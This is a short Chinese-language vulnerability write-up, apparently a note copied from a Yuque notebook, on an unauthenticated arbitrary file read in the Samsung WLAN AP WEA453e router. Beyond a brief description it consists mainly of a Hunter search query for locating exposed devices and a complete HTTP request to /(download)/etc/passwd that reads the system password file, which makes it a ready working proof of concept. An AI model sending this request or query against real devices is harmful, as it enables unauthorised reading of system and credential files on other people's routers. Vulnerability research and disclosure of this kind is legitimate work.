# 三星路由器WLAN AP任意文件读取漏洞

# 一、漏洞简介
三星 WLAN AP WEA453e路由器存在任意文件读取漏洞，可在未授权的情况下获取敏感信息。

# 二、影响版本
+ 三星 WLAN AP WEA453e路由器

# 三、资产测绘
+ hunter`web.title="Samsung WLAN AP"`
+ 特征

![1699981974720-33031d9c-1da8-4cf7-87e1-1b3f1b65341d.png](./img/MnDBMhl-Vf5EcH4Y/1699981974720-33031d9c-1da8-4cf7-87e1-1b3f1b65341d-129492.png)

# 四、漏洞复现
```plain
GET /(download)/etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1699982107952-6d999eff-c332-4c61-8047-73509df4ff1b.png](./img/MnDBMhl-Vf5EcH4Y/1699982107952-6d999eff-c332-4c61-8047-73509df4ff1b-435942.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ypkfb8s12ng42izh>